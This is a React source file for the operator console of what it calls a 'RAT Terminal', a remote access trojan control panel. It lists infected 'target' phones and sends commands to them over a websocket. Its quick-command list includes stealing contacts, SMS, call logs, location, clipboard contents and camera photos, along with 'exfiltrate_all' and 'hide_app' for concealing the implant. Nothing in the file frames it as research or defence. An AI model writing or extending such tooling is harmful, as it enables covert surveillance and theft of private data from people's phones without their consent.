import React, { useState, useEffect, useRef } from "react";
import io from "socket.io-client";
import {
  FiSend,
  FiTerminal,
  FiTrash2,
  FiCopy,
  FiSmartphone,
} from "react-icons/fi";
import toast from "react-hot-toast";
import axios from "axios";

const API = import.meta.env.VITE_API_URL || "http://localhost:5000";
const WS_URL = import.meta.env.VITE_API_URL || "http://localhost:5000";

export default function Terminal() {
  const [socket, setSocket] = useState(null);
  const [devices, setDevices] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [input, setInput] = useState("");
  const [output, setOutput] = useState([]);
  const [connected, setConnected] = useState(false);
  const terminalRef = useRef(null);

  useEffect(() => {
    fetchDevices();

    const s = io(WS_URL, {
      auth: { token: localStorage.getItem("token") },
    });

    s.on("connect", () => setConnected(true));
    s.on("disconnect", () => setConnected(false));

    s.on("device:online", fetchDevices);
    s.on("device:offline", fetchDevices);

    setSocket(s);

    return () => s.close();
  }, []);

  const fetchDevices = async () => {
    try {
      const token = localStorage.getItem("token");
      const res = await axios.get(`${API}/api/devices`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      setDevices(res.data.filter((d) => d.status === "online"));
    } catch (err) {
      console.error("Failed to fetch devices:", err);
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!input.trim() || !selectedDevice || !socket) return;

    addOutput(`[${selectedDevice.deviceId.slice(0, 8)}] > ${input}`, "input");

    socket.emit("command:send", {
      deviceId: selectedDevice.deviceId,
      type: input.trim().split(" ")[0],
      params: parseParams(input.trim()),
    });

    setInput("");
  };

  const parseParams = (cmd) => {
    const parts = cmd.split(" ");
    if (parts.length <= 1) return {};
    try {
      return JSON.parse(parts.slice(1).join(" "));
    } catch {
      return { value: parts.slice(1).join(" ") };
    }
  };

  const addOutput = (text, type = "output") => {
    setOutput((prev) => [
      ...prev,
      { text, type, time: new Date().toLocaleTimeString() },
    ]);
    setTimeout(() => {
      terminalRef.current?.scrollTo(0, terminalRef.current.scrollHeight);
    }, 100);
  };

  const presetCommands = [
    "get_contacts",
    "get_sms",
    "get_call_logs",
    "get_location",
    "take_photo",
    "get_device_info",
    "get_installed_apps",
    "get_battery",
    "get_sim_info",
    "get_network_info",
    "get_clipboard",
    "exfiltrate_all",
    "hide_app",
    "unhide_app",
  ];

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold">Terminal</h1>
          <p className="text-dark-400 mt-1">Remote command execution</p>
        </div>
        <div className="flex items-center gap-3">
          <div
            className={`px-3 py-1.5 rounded-full text-sm flex items-center gap-2 ${
              connected
                ? "bg-green-500/10 text-green-400"
                : "bg-red-500/10 text-red-400"
            }`}
          >
            <span
              className={`w-2 h-2 rounded-full ${
                connected ? "bg-green-400 animate-pulse" : "bg-red-400"
              }`}
            />
            {connected ? "WS Connected" : "Disconnected"}
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
        {/* Device Selection */}
        <div className="glass-effect rounded-2xl p-4">
          <h3 className="font-semibold mb-4 text-sm">Target Device</h3>
          {devices.length === 0 ? (
            <div className="text-center py-8 text-dark-400">
              <FiSmartphone className="text-2xl mx-auto mb-2 opacity-50" />
              <p className="text-sm">No online devices</p>
            </div>
          ) : (
            <div className="space-y-2">
              {devices.map((device) => (
                <button
                  key={device.deviceId}
                  onClick={() => setSelectedDevice(device)}
                  className={`w-full text-left p-3 rounded-xl transition-all ${
                    selectedDevice?.deviceId === device.deviceId
                      ? "bg-primary-500/20 border border-primary-500/30"
                      : "bg-dark-700/30 hover:bg-dark-700/50 border border-transparent"
                  }`}
                >
                  <div className="flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-green-400" />
                    <span className="text-sm font-medium">
                      {device.alias || device.deviceModel || "Unknown"}
                    </span>
                  </div>
                  <p className="text-xs text-dark-400 mt-1">
                    {device.deviceId.slice(0, 12)}...
                  </p>
                </button>
              ))}
            </div>
          )}

          <div className="mt-4">
            <p className="text-xs text-dark-400 mb-2">Quick Commands:</p>
            <div className="flex flex-wrap gap-1.5">
              {presetCommands.map((cmd) => (
                <button
                  key={cmd}
                  onClick={() => setInput(cmd)}
                  className="text-xs px-2 py-1 rounded-lg bg-dark-700/50 text-dark-300 hover:text-white hover:bg-dark-700 transition-all"
                >
                  {cmd}
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Terminal */}
        <div className="lg:col-span-3 glass-effect rounded-2xl p-4">
          {/* Output */}
          <div
            ref={terminalRef}
            className="h-96 bg-black rounded-xl p-4 font-mono text-sm overflow-y-auto mb-4 space-y-1"
          >
            <div className="text-green-400">
              ╔══════════════════════════════════════════╗
            </div>
            <div className="text-green-400">║ RAT Terminal v1.0 ║</div>
            <div className="text-green-400">
              ║ Type "help" for available commands ║
            </div>
            <div className="text-green-400">
              ╚══════════════════════════════════════════╝
            </div>
            {output.map((line, i) => (
              <div
                key={i}
                className={
                  line.type === "input"
                    ? "text-primary-400"
                    : line.type === "error"
                    ? "text-red-400"
                    : line.type === "success"
                    ? "text-green-400"
                    : "text-dark-200"
                }
              >
                <span className="text-dark-500">[{line.time}]</span> {line.text}
              </div>
            ))}
          </div>

          {/* Input */}
          <form onSubmit={handleSubmit} className="flex gap-3">
            <div className="flex-1 relative">
              <span className="absolute left-3 top-1/2 -translate-y-1/2 text-dark-400 font-mono text-sm">
                {selectedDevice
                  ? `${selectedDevice.deviceId.slice(0, 8)}>`
                  : "no-target>"}
              </span>
              <input
                type="text"
                value={input}
                onChange={(e) => setInput(e.target.value)}
                placeholder={
                  selectedDevice ? "Enter command..." : "Select a device first"
                }
                disabled={!selectedDevice}
                className="w-full pl-24 pr-4 py-3 rounded-xl bg-dark-700/50 border border-dark-600/50 text-white placeholder-dark-400 focus:outline-none focus:border-primary-500/50 font-mono"
              />
            </div>
            <button
              type="submit"
              disabled={!selectedDevice || !input.trim()}
              className="px-6 py-3 rounded-xl bg-primary-500 text-white hover:bg-primary-600 disabled:opacity-50 disabled:cursor-not-allowed transition-all flex items-center gap-2"
            >
              <FiSend />
              Send
            </button>
          </form>

          {/* Output actions */}
          <div className="mt-3 flex items-center gap-3 text-xs text-dark-400">
            <button
              onClick={() => setOutput([])}
              className="flex items-center gap-1 hover:text-white transition-all"
            >
              <FiTrash2 /> Clear
            </button>
            <button
              onClick={() => {
                navigator.clipboard.writeText(
                  output.map((l) => l.text).join("\n")
                );
                toast.success("Copied to clipboard");
              }}
              className="flex items-center gap-1 hover:text-white transition-all"
            >
              <FiCopy /> Copy All
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

